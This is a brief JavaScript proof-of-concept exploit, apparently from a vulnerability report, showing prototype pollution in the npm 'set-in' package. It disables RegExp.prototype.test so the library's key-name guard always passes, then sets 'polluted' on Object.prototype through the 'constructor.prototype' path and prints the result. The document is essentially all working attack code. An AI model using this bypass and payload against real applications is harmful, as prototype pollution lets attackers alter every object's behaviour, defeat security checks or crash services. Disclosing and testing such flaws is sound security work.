RegExp.prototype.test = () => false;
const si = require('set-in');
const obj = {};
console.log({}.polluted);
si(obj, [
    'constructor.prototype',
    'polluted'
], 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');